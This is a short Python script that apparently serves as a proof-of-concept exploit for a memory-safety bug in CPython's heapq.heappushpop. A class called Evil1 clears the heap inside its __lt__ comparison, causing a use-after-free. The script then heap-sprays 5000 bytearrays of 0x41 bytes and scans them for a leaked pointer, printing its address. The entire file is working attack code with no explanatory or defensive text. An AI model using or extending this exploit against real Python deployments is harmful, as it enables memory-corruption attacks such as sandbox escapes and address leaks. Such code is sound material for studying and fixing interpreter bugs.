import heapq
import sys

class Evil1:
    def __lt__(self, other):
        heap.clear()
        
        # heap was 50 items -> 400 bytes
        payload = b'\x41' * 399
        
        global spray
        spray = [bytearray(payload) for _ in range(5000)]
        
        return False

heap = [0] * 50
heap[0] = Evil1()

target = bytearray(b"HELLO")

print("Calling heappushpop...")
try:
    heapq.heappushpop(heap, target)
except Exception as e:
    print("Exception:", e)

print("Checking spray...")
for i, b in enumerate(spray):
    if b[:4] != b'\x41\x41\x41\x41':
        ptr_bytes = b[:8]
        if len(ptr_bytes) < 8:
            ptr_bytes += b'\x00' * (8 - len(ptr_bytes))
        ptr = int.from_bytes(ptr_bytes, 'little')
        print(f"FOUND POINTER in spray[{i}]: {hex(ptr)}")
        break
else:
    print("No pointer found.")
